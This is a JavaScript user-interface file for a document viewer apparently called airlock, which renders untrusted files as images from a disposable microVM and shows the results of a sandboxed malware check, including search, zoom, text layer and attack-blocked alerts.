"use strict";
// airlock UI. Everything shown here comes from the Rust side: PNG pixels,
// numbers, and sanitised text — always inserted with textContent, never HTML.

const { invoke } = window.__TAURI__.core;
const $ = (id) => document.getElementById(id);

const PT_TO_PX = 96 / 72;
const ZOOMS = [0.5, 0.67, 0.75, 0.9, 1, 1.1, 1.25, 1.5, 1.75, 2, 2.5, 3];

const state = {
  pages: [],          // [{w, h, el, img, text, layer, key, url, textState}]
  zoom: 1,
  fitMode: true,      // keep fitting the width on resize / panel toggle
  hits: [],
  hitIndex: -1,
  queue: [],
  rendering: false,
  docOpen: false,
  observer: null,
  findings: null,
  pixelsOnly: false,  // no document text leaves the VM (enforced in Rust too)
};

// ---------------------------------------------------------------- helpers

function status(text, isError = false) {
  const s = $("status");
  s.textContent = text;
  s.classList.toggle("error", isError);
}

function busy(text) {
  $("busy").hidden = !text;
  $("busy-text").textContent = text || "";
}

function el(tag, cls, text) {
  const e = document.createElement(tag);
  if (cls) e.className = cls;
  if (text !== undefined) e.textContent = text;
  return e;
}

function renderDpi() {
  const dpi = 96 * state.zoom * (window.devicePixelRatio || 1);
  return Math.min(600, Math.max(20, Math.round(dpi / 24) * 24));
}

function currentPage() {
  const viewer = $("viewer");
  const mid = viewer.scrollTop + viewer.clientHeight / 3;
  let best = 0;
  for (let i = 0; i < state.pages.length; i++) {
    if (state.pages[i].el.offsetTop <= mid) best = i;
  }
  return best;
}

// ---------------------------------------------------------------- opening

async function openWith(promise, label) {
  busy(`Booting a disposable microVM for ${label}…`);
  status("Opening…");
  const t0 = performance.now();
  try {
    const r = await promise;
    // Older call sites return the info itself; open_many returns {info, elsewhere}.
    const info = r && "elsewhere" in r ? r.info : r;
    const more = r && r.elsewhere ? ` · ${r.elsewhere} more in new window${r.elsewhere > 1 ? "s" : ""} (one VM each)` : "";
    if (!info) { status(more ? more.slice(3) : "Ready"); return; }
    const sameFile = state.reopening;
    setupDocument(info);
    if (!sameFile || (!check.report && !check.running)) {
      clearCheck();
      if (autoCheckOn()) startCheck();
    } else showCheck();
    const secs = ((performance.now() - t0) / 1000).toFixed(1);
    status(`${info.pages.length} page(s) · VM ready in ${(info.ready_ms / 1000).toFixed(1)}s · opened in ${secs}s${more}`);
  } catch (e) {
    resetDocument();
    // Attacked while opening: the red alert, and the full check runs anyway.
    if (String(e).startsWith("the document attacked its VM")) {
      attackBlocked(e);
      $("seal").classList.remove("stopped");
      if (autoCheckOn()) startCheck();
      return;
    }
    status(`Could not open: ${e}`, true);
    // The file was read but cannot be shown: it can still be analyzed.
    const name = await invoke("chosen_name").catch(() => null);
    if (name) showUndisplayable(name, String(e));
  } finally {
    busy(null);
    state.reopening = false;
  }
}

// Back to the empty state (the previous document's VM is already gone).
function resetDocument() {
  for (const p of state.pages) if (p.url) URL.revokeObjectURL(p.url);
  if (state.observer) state.observer.disconnect();
  Object.assign(state, { pages: [], hits: [], hitIndex: -1, queue: [], findings: null, docOpen: false });
  $("pages").replaceChildren();
  clearCheck();
  for (const id of ["doc", "searchbox", "zoombox", "textbtn", "sheetbtn", "savewrap", "banner", "thumbbtn", "thumbs", "telemetry"]) $(id).hidden = true;
  $("empty").hidden = false;
  closePanel();
}

function showUndisplayable(name, why) {
  const body = openPanel("Cannot display");
  const go = el("button", "primary", "Analyze anyway");
  go.onclick = () => analyze(name);
  body.replaceChildren(
    el("p", "", `${name}: ${why}.`),
    el("p", "note", "Analysis does not need anything visible: it detonates the file in a separate microVM wired to a fake internet and inspects its macros and structure."),
    go,
  );
}

function openDialog() {
  openWith(invoke("pick_and_open"), "the document");
}

function openPaths(paths) {
  const name = state.docOpen ? "the documents" : paths[0].split(/[\\/]/).pop();
  openWith(invoke("open_paths", { paths }), name);
}

// ---------------------------------------------------------------- saving

function toggleSaveMenu(open) {
  const m = $("savemenu");
  m.hidden = open === undefined ? !m.hidden : !open;
  $("savebtn").setAttribute("aria-expanded", String(!m.hidden));
}

async function saveSafeCopy() {
  if (!state.docOpen) return;
  toggleSaveMenu(false);
  const stop = await window.__TAURI__.event.listen("export-progress", (e) => {
    const [i, n] = e.payload;
    status(`Saving safe copy: page ${i} of ${n}…`);
  });
  try {
    const path = await invoke("save_safe_copy");
    status(path ? `Saved a safe copy (pixels only) to ${path}` : "Ready");
  } catch (e) {
    status(`Could not save: ${e}`, true);
  } finally {
    stop();
  }
}

// Prints the pixels: every page is drawn once more at print resolution.
async function printDocument() {
  if (!state.docOpen) return;
  toggleSaveMenu(false);
  const out = $("printout");
  const urls = [];
  try {
    for (let i = 0; i < state.pages.length; i++) {
      status(`Preparing to print: page ${i + 1} of ${state.pages.length}…`);
      const buf = await invoke("render_page", { page: i, dpi: 150 });
      const url = URL.createObjectURL(new Blob([buf], { type: "image/png" }));
      urls.push(url);
      const img = el("img");
      img.src = url;
      out.append(img);
    }
    await Promise.all([...out.querySelectorAll("img")].map((img) => img.decode().catch(() => {})));
    window.print();
    status("Ready");
  } catch (e) {
    status(`Could not print: ${e}`, true);
  } finally {
    // print() returns once the dialog is done with the pages.
    setTimeout(() => { out.replaceChildren(); urls.forEach((u) => URL.revokeObjectURL(u)); }, 1000);
  }
}

async function saveReport() {
  try {
    const path = await invoke("save_report");
    if (path) status(`Saved the report to ${path}`);
  } catch (e) {
    status(`Could not save the report: ${e}`, true);
  }
}

function openPath(path) {
  const name = path.split(/[\\/]/).pop();
  openWith(invoke("open_path", { path }), name);
}

function setupDocument(info) {
  for (const p of state.pages) if (p.url) URL.revokeObjectURL(p.url);
  state.pages = [];
  state.hits = [];
  state.hitIndex = -1;
  state.queue = [];
  state.findings = null;
  state.aiHints = null;
  state.textCache = [];
  state.docOpen = true;
  $("banner").hidden = true;
  $("qcount").textContent = "";
  closePanel();

  $("docname").textContent = info.name;
  $("sheetbtn").hidden = !info.spreadsheet;
  $("seal").classList.remove("stopped");
  $("seal").querySelector(".label").textContent = "Sealed · microVM · no network";
  for (const id of ["doc", "searchbox", "zoombox", "savewrap"]) $(id).hidden = false;
  $("textbtn").hidden = state.pixelsOnly;
  $("empty").hidden = true;

  const container = $("pages");
  container.replaceChildren();
  if (state.observer) state.observer.disconnect();
  state.observer = new IntersectionObserver(onVisible, { root: $("viewer"), rootMargin: "600px 0px" });

  info.pages.forEach(([w, h], i) => {
    const pageEl = el("div", "page loading");
    const img = el("img");
    img.alt = `Page ${i + 1}`;
    const text = el("div", "text");
    const layer = el("div", "layer");
    pageEl.append(img, text, layer, el("span", "num", String(i + 1)));
    pageEl.dataset.index = String(i);
    container.append(pageEl);
    state.pages.push({ w, h, el: pageEl, img, text, layer, key: null, url: null, visible: false, textState: null });
    state.observer.observe(pageEl);
  });
  fitWidth();
  $("viewer").scrollTop = 0;
}

// ---------------------------------------------------------------- rendering

function layout() {
  const scale = state.zoom * PT_TO_PX;
  $("pages").style.setProperty("--s", String(scale));
  for (const p of state.pages) {
    p.el.style.width = `${Math.round(p.w * scale)}px`;
    p.el.style.height = `${Math.round(p.h * scale)}px`;
  }
  $("zlabel").textContent = `${Math.round(state.zoom * 100)}%`;
  drawHighlights();
  for (const p of state.pages) if (p.visible) enqueue(state.pages.indexOf(p));
}

function onVisible(entries) {
  for (const e of entries) {
    const i = Number(e.target.dataset.index);
    state.pages[i].visible = e.isIntersecting;
    if (e.isIntersecting) enqueue(i);
  }
}

function enqueue(i) {
  if (!state.queue.includes(i)) state.queue.push(i);
  pump();
}

async function pump() {
  if (state.rendering) return;
  state.rendering = true;
  try {
    while (state.queue.length) {
      // Nearest-to-view first.
      const cur = currentPage();
      state.queue.sort((a, b) => Math.abs(a - cur) - Math.abs(b - cur));
      const i = state.queue.shift();
      const p = state.pages[i];
      const dpi = renderDpi();
      if (!p || !p.visible || p.key === dpi) continue;
      try {
        const buf = await invoke("render_page", { page: i, dpi });
        const url = URL.createObjectURL(new Blob([buf], { type: "image/png" }));
        if (p.url) URL.revokeObjectURL(p.url);
        p.url = url;
        p.img.src = url;
        p.key = dpi;
        p.el.classList.remove("loading");
      } catch (e) {
        if (!vmStopped(e)) status(`Page ${i + 1}: ${e}`, true);
        break;
      }
      if (!p.textState && !state.pixelsOnly) await loadTextLayer(p, i);
    }
  } finally {
    state.rendering = false;
  }
  checkViewingFindings();
}

// ---------------------------------------------------------------- text layer
// Invisible text over the page image so it can be selected and copied like
// in any PDF viewer. Lines and boxes come from the VM; the text is the same
// sanitised text as the Text panel and is inserted with textContent only.

async function loadTextLayer(p, i) {
  p.textState = "loading";
  let lines;
  try {
    lines = await invoke("page_lines", { page: i });
  } catch (e) {
    p.textState = null;
    if (!vmStopped(e)) status(`Page ${i + 1} text: ${e}`, true);
    return;
  }
  const spans = [];
  for (const { rect: [x0, y0, x1, y1], text } of lines) {
    const w = x1 - x0, h = y1 - y0;
    // Vertical / rotated lines would need rotation; leave them out.
    if (!text || (h > w * 1.5 && [...text].length > 1)) continue;
    const span = el("span", "", text);
    span.style.setProperty("--x", String(x0));
    span.style.setProperty("--y", String(y0));
    span.style.setProperty("--h", String(h));
    spans.push([span, w]);
  }
  p.text.replaceChildren(...spans.flatMap(([span]) => [span, document.createElement("br")]));
  // Stretch each line to its real width (the page's fonts are not ours).
  // The ratio does not depend on zoom, so it is measured once.
  const scale = state.zoom * PT_TO_PX;
  const widths = spans.map(([span]) => span.offsetWidth);
  spans.forEach(([span, w], k) => {
    if (widths[k] > 0) span.style.transform = `scaleX(${(w * scale) / widths[k]})`;
  });
  p.textState = "ready";
}

async function setPixelsOnly(on, remember = true) {
  await invoke("set_pixels_only", { on });
  state.pixelsOnly = on;
  if (remember) try { localStorage.setItem("airlock.pixelsOnly", on ? "1" : "0"); } catch {}
  $("m-pixels").setAttribute("aria-checked", String(on));
  $("textbtn").hidden = on || !state.docOpen;
  if (on) {
    getSelection()?.removeAllRanges();
    for (const p of state.pages) { p.text.replaceChildren(); p.textState = null; }
    if ($("panel-title").textContent.startsWith("Text")) closePanel();
    status("Pixels only: no document text leaves the VM");
  } else {
    for (const [i, p] of state.pages.entries()) if (p.key && !p.textState) await loadTextLayer(p, i);
    status("Text selection on");
  }
}

// Copy plain text only: the layer is transparent, so its HTML would paste
// as invisible text into rich editors.
document.addEventListener("copy", (e) => {
  const sel = getSelection();
  if (!sel || sel.isCollapsed || !$("pages").contains(sel.anchorNode)) return;
  e.clipboardData.setData("text/plain", sel.toString());
  e.preventDefault();
});

async function checkViewingFindings() {
  if (!state.docOpen) return;
  const report = await invoke("viewing_findings").catch(() => null);
  if (!report) return;
  state.findings = report;
  const n = report.findings.length;
  $("banner-text").textContent = `While rendering, this document triggered ${n} blocked action(s) inside the VM.`;
  $("banner").hidden = false;
}

// ---------------------------------------------------------------- zoom

function setZoom(z, anchorPage) {
  const keep = anchorPage ?? currentPage();
  state.zoom = Math.min(3, Math.max(0.25, z));
  layout();
  const p = state.pages[keep];
  if (p) $("viewer").scrollTop = p.el.offsetTop - 12;
}

// Ctrl + scroll wheel (or touchpad pinch, which arrives as Ctrl+wheel):
// zoom around the pointer, smoothly for small touchpad steps.
$("viewer").addEventListener("wheel", (e) => {
  if (!e.ctrlKey) return;
  e.preventDefault(); // not the web view's own page zoom
  if (!state.docOpen || !state.pages.length) return;
  const viewer = $("viewer"), box = viewer.getBoundingClientRect();
  const mx = e.clientX - box.left, my = e.clientY - box.top;
  const delta = e.deltaMode === 1 ? e.deltaY * 16 : e.deltaY;
  const old = state.zoom;
  const next = Math.min(3, Math.max(0.25, old * Math.exp(-delta * 0.0025)));
  if (Math.abs(next - old) < 0.001) return;
  state.fitMode = false;
  const ratio = next / old;
  const x = viewer.scrollLeft + mx, y = viewer.scrollTop + my;
  state.zoom = next;
  layout();
  viewer.scrollLeft = x * ratio - mx;
  viewer.scrollTop = y * ratio - my;
}, { passive: false });

function stepZoom(dir) {
  state.fitMode = false;
  const z = state.zoom;
  const next = dir > 0 ? ZOOMS.find((v) => v > z + 0.001) : [...ZOOMS].reverse().find((v) => v < z - 0.001);
  setZoom(next ?? z);
}

function fitWidth() {
  state.fitMode = true;
  if (!state.pages.length) return;
  const maxW = Math.max(...state.pages.map((p) => p.w));
  const avail = $("viewer").clientWidth - 48;
  setZoom(Math.min(2, avail / (maxW * PT_TO_PX)), currentPage());
}

// ---------------------------------------------------------------- search

async function runSearch() {
  const q = $("q").value.trim();
  if (!state.docOpen) return;
  if (!q) {
    state.hits = [];
    state.hitIndex = -1;
    $("qcount").textContent = "";
    drawHighlights();
    return;
  }
  status(`Searching inside the VM for “${q}”…`);
  try {
    state.hits = await invoke("search", { query: q });
    state.hitIndex = state.hits.length ? 0 : -1;
    status(`${state.hits.length} match(es) for “${q}”`);
    drawHighlights();
    showHit();
  } catch (e) {
    if (!vmStopped(e)) status(`Search failed: ${e}`, true);
  }
}

// The document's VM is gone (it stopped, or was shut down as hostile):
// say so plainly and offer a fresh one. Why is in ~/.local/state/airlock/app.log.
// The tripwire: the document tried to run a program, use the network or
// attack the system from inside its VM, which was destroyed at once.
function attackBlocked(e) {
  const msg = String(e);
  if (!msg.startsWith("the document attacked its VM")) return false;
  check.attacked = true;
  check.attackMsg = msg;
  showCheck();
  const what = msg.replace(/^the document attacked its VM: /, "").replace(/ \(blocked; the VM was destroyed at once\)$/, "");
  status("Attack blocked: the document's VM was destroyed", true);
  $("seal").classList.add("stopped");
  $("seal").querySelector(".label").textContent = "VM destroyed · attack blocked";
  const body = openPanel("Attack blocked");
  const v = el("div", "verdict malicious");
  v.append(el("div", "label", "ATTACK BLOCKED"), el("h3", "", "This document tried to attack your computer"));
  const advice = el("div", "advice");
  advice.append(el("strong", "", "What happened"), el("p", "", "While it was being shown, the document tried to do something no document needs to do. airlock blocked it and destroyed the document's VM at once, so it got no second try. Nothing reached your computer."));
  advice.append(el("strong", "", "What to do"), el("p", "", "Do not open the original in any other program. Delete it, and if it came by email, report it as phishing. The pages already shown are only pictures and are safe to look at."));
  v.append(advice);
  const tech = el("details", "");
  tech.append(el("summary", "", "Technical details"), el("pre", "", what));
  body.replaceChildren(v, tech);
  const go = el("button", "", "Full analysis…");
  go.onclick = () => showAnalysis();
  body.append(go);
  return true;
}

function vmStopped(e) {
  if (attackBlocked(e)) return true;
  // After the tripwire, the other requests in flight fail too: already explained.
  if (check.attacked) return true;
  const msg = String(e);
  const stopped = msg.startsWith("the document's VM stopped");
  const hostile = msg.startsWith("protocol violation");
  if (!stopped && !hostile) return false;
  status(hostile ? "The document's VM broke airlock's rules and was shut down" : "The document's VM stopped", true);
  $("seal").classList.add("stopped");
  $("seal").querySelector(".label").textContent = "VM stopped · nothing is running";
  notify(
    hostile ? "VM shut down for safety" : "This document's VM stopped",
    hostile
      ? "The VM showing this document broke airlock's rules (what an exploit looks like from outside), so it was destroyed. Run Analyze for details. Reopening starts a new, clean VM."
      : "The disposable VM showing this document is no longer running, so pages, search and text are unavailable. Reopening starts a new one in a second.",
    [["Reopen", reopenDocument], ["Close", hideToast]],
  );
  return true;
}

function reopenDocument() {
  hideToast();
  state.reopening = true;
  return openWith(invoke("reopen"), $("docname").textContent || "the document");
}

function drawHighlights() {
  const scale = state.zoom * PT_TO_PX;
  for (const p of state.pages) p.layer.replaceChildren();
  state.hits.forEach((h, idx) => {
    const p = state.pages[h.page];
    if (!p) return;
    const [x0, y0, x1, y1] = h.rect;
    const d = el("div", idx === state.hitIndex ? "hl current" : "hl");
    d.style.left = `${x0 * scale - 1}px`;
    d.style.top = `${y0 * scale - 1}px`;
    d.style.width = `${(x1 - x0) * scale + 2}px`;
    d.style.height = `${(y1 - y0) * scale + 2}px`;
    p.layer.append(d);
  });
  $("qcount").textContent = state.hits.length ? `${state.hitIndex + 1} / ${state.hits.length}` : ($("q").value.trim() ? "0" : "");
}

function showHit() {
  const h = state.hits[state.hitIndex];
  if (!h) return;
  drawHighlights();
  const p = state.pages[h.page];
  const scale = state.zoom * PT_TO_PX;
  const viewer = $("viewer");
  viewer.scrollTop = p.el.offsetTop + h.rect[1] * scale - viewer.clientHeight / 3;
}

function stepHit(dir) {
  if (!state.hits.length) return runSearch();
  state.hitIndex = (state.hitIndex + dir + state.hits.length) % state.hits.length;
  showHit();
}

// ---------------------------------------------------------------- panels

function openPanel(title) {
  textSync.open = false;
  $("panel-title").textContent = title;
  $("panel").hidden = false;
  if (state.fitMode) fitWidth();
  return $("panel-body");
}

// The side panel's left edge can be dragged; the width is remembered and a
// double-click goes back to the default (CSS: min(440px, 45vw)).
function applyPanelWidth() {
  const w = Number(pref("airlock.panelWidth", "0"));
  const max = Math.max(320, window.innerWidth * 0.75);
  // Narrow windows: the panel covers the pages (CSS), no custom width.
  $("panel").style.width = w && window.innerWidth > 860 ? `${Math.min(max, Math.max(280, w))}px` : "";
}
{
  const grip = $("panel-resize");
  let drag = null;
  grip.addEventListener("pointerdown", (e) => {
    drag = { x: e.clientX, w: $("panel").getBoundingClientRect().width };
    grip.setPointerCapture(e.pointerId);
    document.body.classList.add("resizing");
    e.preventDefault();
  });
  grip.addEventListener("pointermove", (e) => {
    if (!drag) return;
    const max = Math.max(320, window.innerWidth * 0.75);
    $("panel").style.width = `${Math.min(max, Math.max(280, drag.w + drag.x - e.clientX))}px`;
  });
  const end = () => {
    if (!drag) return;
    drag = null;
    document.body.classList.remove("resizing");
    setPref("airlock.panelWidth", String(Math.round($("panel").getBoundingClientRect().width)));
    if (state.fitMode && state.docOpen) fitWidth();
  };
  grip.addEventListener("pointerup", end);
  grip.addEventListener("pointercancel", end);
  grip.addEventListener("dblclick", () => {
    setPref("airlock.panelWidth", "0");
    applyPanelWidth();
    if (state.fitMode && state.docOpen) fitWidth();
  });
  window.addEventListener("resize", applyPanelWidth);
  applyPanelWidth();
}

function closePanel() {
  textSync.open = false;
  $("panel").hidden = true;
  $("panel-body").replaceChildren();
  if (state.fitMode && state.docOpen) fitWidth();
}

// The whole document's text, page by page, scrolling together with the
// pages: scrolling either side moves the other to the same place (by the
// same fraction through the page). Pages are extracted in the VM as they
// come into view, and cached per document.
const textSync = { open: false, driver: null, until: 0, observer: null };
function pageText(i) {
  state.textCache ||= [];
  state.textCache[i] ||= invoke("page_text", { page: i }).catch((e) => { state.textCache[i] = null; throw e; });
  return state.textCache[i];
}
async function showText() {
  const body = openPanel("Text");
  textSync.open = true;
  const copy = el("button", "", "Copy all");
  const row = el("div", "row");
  row.append(copy, el("span", "note", "Extracted inside the VM; control and bidi-override characters removed."));
  // Optional: hints that the text came from an AI chat tool (off by default).
  const ai = el("label", "check");
  const box = el("input");
  box.type = "checkbox";
  box.checked = pref("airlock.aiHints", "0") === "1";
  ai.append(box, el("span", "", "Check for AI-written text"));
  ai.title = "Looks for characters and leftovers that AI chat tools put into pasted text, and stock phrasing. Hints, not proof.";
  const aiOut = el("div", "ai-hints");
  box.onchange = () => { setPref("airlock.aiHints", box.checked ? "1" : "0"); showAiHints(aiOut, box.checked); };
  const doc = el("div", "text-doc");
  const sections = state.pages.map((_, i) => {
    const sec = el("section", "tpage");
    sec.dataset.index = String(i);
    const pre = el("pre", "pending", "…");
    sec.append(el("h3", "", `Page ${i + 1}`), pre);
    doc.append(sec);
    return sec;
  });
  body.replaceChildren(row, ai, aiOut, doc);
  showAiHints(aiOut, box.checked);

  const fill = async (i) => {
    const sec = sections[i];
    if (!sec || sec.dataset.loaded) return;
    sec.dataset.loaded = "1";
    const pre = sec.querySelector("pre");
    try {
      const text = await pageText(i);
      pre.textContent = text || "(no text on this page — it may be a scanned image)";
      pre.className = text ? "" : "empty";
    } catch (e) {
      pre.textContent = `Could not extract text: ${e}`;
      pre.className = "empty";
      delete sec.dataset.loaded;
    }
    // Heights changed: keep the panel aligned with the pages.
    if (textSync.driver !== "panel") syncPanelToViewer();
  };
  if (textSync.observer) textSync.observer.disconnect();
  textSync.observer = new IntersectionObserver((entries) => {
    for (const e of entries) if (e.isIntersecting) fill(Number(e.target.dataset.index));
  }, { root: body, rootMargin: "400px 0px" });
  sections.forEach((sec) => textSync.observer.observe(sec));
  const here = currentPage();
  await fill(here);
  syncPanelToViewer(true);

  copy.onclick = async () => {
    copy.disabled = true;
    const parts = [];
    for (let i = 0; i < state.pages.length; i++) {
      copy.textContent = `Reading page ${i + 1} of ${state.pages.length}…`;
      try { parts.push(`--- Page ${i + 1} ---\n${await pageText(i)}`); } catch { parts.push(`--- Page ${i + 1} ---\n(could not extract)`); }
    }
    const all = parts.join("\n\n");
    try { await navigator.clipboard.writeText(all); copy.textContent = "Copied"; }
    catch { const r = document.createRange(); r.selectNodeContents(doc); getSelection().removeAllRanges(); getSelection().addRange(r); copy.textContent = "Selected — press Ctrl+C"; }
    copy.disabled = false;
  };
}

// Position of a section/page inside its scroll container.
const offsetIn = (node, box) => node.getBoundingClientRect().top - box.getBoundingClientRect().top + box.scrollTop;
function syncPanelToViewer(force = false) {
  if (!textSync.open || (!force && textSync.driver === "panel" && Date.now() < textSync.until)) return;
  const viewer = $("viewer"), body = $("panel-body");
  const i = currentPage(), page = state.pages[i];
  const sec = body.querySelector(`.tpage[data-index="${i}"]`);
  if (!page || !sec) return;
  // Both sides line up at a reading line a third of the way down.
  const f = Math.min(1, Math.max(0, (viewer.scrollTop + viewer.clientHeight / 3 - page.el.offsetTop) / page.el.offsetHeight));
  textSync.driver = "viewer";
  textSync.until = Date.now() + 250;
  body.scrollTop = offsetIn(sec, body) + f * sec.offsetHeight - body.clientHeight / 3;
  for (const s of body.querySelectorAll(".tpage.current")) s.classList.remove("current");
  sec.classList.add("current");
}
function syncViewerToPanel() {
  if (!textSync.open || (textSync.driver === "viewer" && Date.now() < textSync.until)) return;
  const viewer = $("viewer"), body = $("panel-body");
  const line = body.scrollTop + body.clientHeight / 3;
  let sec = null;
  for (const s of body.querySelectorAll(".tpage")) {
    if (offsetIn(s, body) <= line) sec = s; else break;
  }
  if (!sec) return;
  const page = state.pages[Number(sec.dataset.index)];
  const f = Math.min(1, Math.max(0, (line - offsetIn(sec, body)) / sec.offsetHeight));
  textSync.driver = "panel";
  textSync.until = Date.now() + 250;
  viewer.scrollTop = page.el.offsetTop + f * page.el.offsetHeight - viewer.clientHeight / 3;
  for (const s of body.querySelectorAll(".tpage.current")) s.classList.remove("current");
  sec.classList.add("current");
}
$("viewer").addEventListener("scroll", () => syncPanelToViewer(), { passive: true });
$("panel-body").addEventListener("scroll", () => syncViewerToPanel(), { passive: true });

// One check per opened document, cached; shown in the Text panel.
async function showAiHints(out, on) {
  if (!on) { out.replaceChildren(); return; }
  out.replaceChildren(el("p", "note", "Checking the document's text inside the VM…"));
  try {
    if (!state.aiHints) state.aiHints = await invoke("ai_hints");
    const h = state.aiHints;
    const label = { strong: "Strong signs of AI-written text", some: "Some signs of AI-written text", none: "No clear signs of AI-written text" }[h.level];
    const card = el("div", `ai-card ${h.level}`);
    card.append(el("strong", "", label), el("p", "", h.summary));
    if (h.signals.length) {
      const ul = el("ul", "");
      for (const s of h.signals) {
        const li = el("li", "");
        li.append(el("span", `ai-tag ${s.strength}`, s.strength), el("b", "", ` ${s.title}: `), document.createTextNode(s.detail));
        ul.append(li);
      }
      card.append(ul);
    }
    card.append(el("p", "note", `Checked ${h.words} words on the first pages.`));
    out.replaceChildren(card);
  } catch (e) {
    out.replaceChildren(el("p", "note", `Could not check: ${e}`));
  }
}

// Plain language first (title, why it matters); the evidence, who saw it
// and the ATT&CK technique are one click away under each finding.
function renderReport(body, report, title) {
  const v = report.verdict;
  const cls = v.startsWith("MALICIOUS") || v.startsWith("LIKELY") ? "malicious" : v.startsWith("SUSPICIOUS") ? "suspicious" : "clean";
  const box = el("div", `verdict ${cls}`);
  box.append(el("div", "label", v), el("h3", "", report.headline || v));
  const advice = el("div", "advice");
  advice.append(el("strong", "", "What to do"), el("p", "", report.advice || report.summary));
  box.append(advice);
  const nodes = [box];
  if (title) nodes.push(el("p", "note", title));

  const important = report.findings.filter((f) => f.severity !== "info");
  const notes = report.findings.filter((f) => f.severity === "info");
  if (important.length) {
    const kinds = (s) => new Set(important.filter((f) => f.severity === s).map((f) => f.title + f.source)).size;
    const counts = ["high", "medium", "low"].map((s) => [s, kinds(s)]).filter(([, n]) => n);
    const row = el("div", "counts");
    for (const [s, n] of counts) row.append(el("span", `sev ${s}`, `${n} ${s === "medium" ? "medium" : s}`));
    nodes.push(el("h4", "section", "What we found"), row);
  }
  // One card per kind of finding; every piece of evidence inside it.
  const groups = [];
  for (const f of important) {
    const g = groups.find((x) => x.f.title === f.title && x.f.severity === f.severity && x.f.source === f.source);
    if (g) g.all.push(f); else groups.push({ f, all: [f] });
  }
  for (const { f, all } of groups) {
    const card = el("div", `finding ${f.severity}`);
    const head = el("div", "f-head");
    head.append(el("span", `sev ${f.severity}`, f.severity === "medium" ? "med" : f.severity), el("span", "f-title", f.title || f.what));
    if (all.length > 1) head.append(el("span", "f-count", `×${all.length}`));
    card.append(head);
    if (f.explain) card.append(el("p", "f-explain", f.explain));
    const more = el("details", "tech");
    more.append(el("summary", "", "Technical details"));
    const dl = el("dl");
    const row = (k, val) => { if (val && val !== "-") dl.append(el("dt", "", k), el("dd", "", val)); };
    all.forEach((e, i) => row(i ? "" : "Evidence", e.what));
    row("Seen by", f.seen_by);
    row("ATT&CK", f.attack);
    more.append(dl);
    card.append(more);
    nodes.push(card);
  }
  if (notes.length) {
    const d = el("details", "notes");
    d.append(el("summary", "", `Also noted · ${notes.length} harmless on ${notes.length > 1 ? "their" : "its"} own`));
    const ul = el("ul");
    for (const f of notes) {
      const li = el("li");
      li.append(el("strong", "", f.title || ""), el("span", "", ` ${f.what}`));
      ul.append(li);
    }
    d.append(ul);
    nodes.push(d);
  }
  if (!report.findings.length) nodes.push(el("p", "note", "No findings."));
  // Step by step, with timings: proof that each VM ran and was destroyed.
  if (report.log && report.log.length) {
    const d = el("details", "runlog");
    d.append(el("summary", "", `Analysis log · ${report.log.length} steps · nothing ran on your computer`));
    const screen = el("div", "console-log");
    for (const [t, line] of report.log) {
      const row = el("div", "ln");
      row.append(el("span", "t", `${Number(t).toFixed(1).padStart(5)}s`), document.createTextNode(` ${line}`));
      if (/crash|killed|broke|stopped answering/i.test(line)) row.classList.add("warn");
      screen.append(row);
    }
    d.append(screen);
    nodes.push(d);
  }
  body.replaceChildren(...nodes);
}

// The malware check (automatic, or from the badge next to the seal): one run
// per opened file, shared by the badge and the report panel.
const check = { gen: 0, running: null, report: null, error: null, attacked: false };

function autoCheckOn() { return pref("airlock.autoCheck", "1") === "1"; }

function verdictClass(v) {
  return /MALICIOUS/.test(v) ? "malicious" : /SUSPICIOUS/.test(v) ? "suspicious" : "clean";
}

function showCheck() {
  const b = $("check");
  const [cls, label, title] = check.attacked
    ? ["malicious", "Attack blocked", "This document tried to attack your computer while it was shown; its VM was destroyed at once. Click for details."]
    : check.running
    ? ["checking", "Checking…", "Checking this file for malware in two separate microVMs (one wired to a fake internet). Keep reading meanwhile. Click to watch."]
    : check.report
      ? [verdictClass(check.report.verdict), { malicious: /LIKELY/.test(check.report.verdict) ? "Likely malicious" : "Malicious", suspicious: "Suspicious", clean: "No threats found" }[verdictClass(check.report.verdict)], `${check.report.headline || check.report.verdict}. Click for the full report.`]
      : check.error
        ? ["failed", "Check failed", `The malware check could not finish: ${check.error}. Click to try again.`]
        : ["idle", "Check for malware", "Detonate this file in a separate microVM wired to a fake internet and report what it tries to do."];
  b.hidden = !cls || !state.docOpen;
  if (!cls) return;
  b.className = `check ${cls}`;
  b.querySelector(".label").textContent = label;
  b.title = title;
  b.setAttribute("aria-label", `Malware check: ${label}`);
}

function clearCheck() {
  Object.assign(check, { gen: check.gen + 1, running: null, report: null, error: null, attacked: false });
  showCheck();
}

function startCheck() {
  const gen = ++check.gen;
  Object.assign(check, { report: null, error: null });
  const p = invoke("analyze").then(
    (r) => {
      if (gen !== check.gen) return r;
      check.report = r;
      return r;
    },
    (e) => {
      if (gen === check.gen) check.error = String(e);
      throw e;
    },
  ).finally(() => {
    if (gen !== check.gen) return;
    check.running = null;
    showCheck();
    // Something found: show it without waiting for a click (unless the
    // analysis panel is already open and waiting for this result).
    if (check.report && verdictClass(check.report.verdict) !== "clean" && !(!$("panel").hidden && $("panel-title").textContent.startsWith("Analysis"))) showAnalysis();
  });
  check.running = p;
  showCheck();
  return p;
}

// The report panel: the finished check, or a spinner until it finishes.
async function showAnalysis(name, again = false) {
  const title = typeof name === "string" ? `Analysis · ${name}` : "Analysis";
  const body = openPanel(title);
  if (again || (!check.report && !check.running)) startCheck();
  if (check.running) {
    const wait = el("div", "row");
    wait.append(el("div", "spinner"), el("span", "note", "Detonating in a separate microVM wired to a fake internet, then examining its disk in a second VM. You can keep reading meanwhile."));
    body.replaceChildren(wait);
    status("Checking for malware in separate microVMs…");
    try { await check.running; } catch {}
    if ($("panel-title").textContent !== title || body.firstChild !== wait) return;
  }
  if (check.report) {
    const report = check.report;
    renderReport(body, report, `${report.document} · analyzed in ${report.seconds.toFixed(1)}s`);
    const save = el("button", "", "Save report…");
    save.title = "Save as text (or .json for tools)";
    save.onclick = saveReport;
    const again = el("button", "", "Check again");
    again.title = "Run the whole analysis again in new microVMs";
    again.onclick = () => showAnalysis(name, true);
    const row = el("div", "row");
    row.append(save, again);
    body.append(row);
    status(`Analysis: ${report.verdict}`);
  } else {
    const retry = el("button", "", "Try again");
    retry.onclick = () => showAnalysis(name, true);
    body.replaceChildren(el("p", "note", `Analysis failed: ${check.error}`), retry);
    status(`Analysis failed: ${check.error}`, true);
  }
}

function analyze(name) {
  return showAnalysis(name);
}

$("check").onclick = () => (check.attacked ? attackBlocked(check.attackMsg) : showAnalysis());

// ---------------------------------------------------------------- wiring

$("open").onclick = openDialog;
$("zin").onclick = () => stepZoom(1);
$("zout").onclick = () => stepZoom(-1);
$("zfit").onclick = fitWidth;
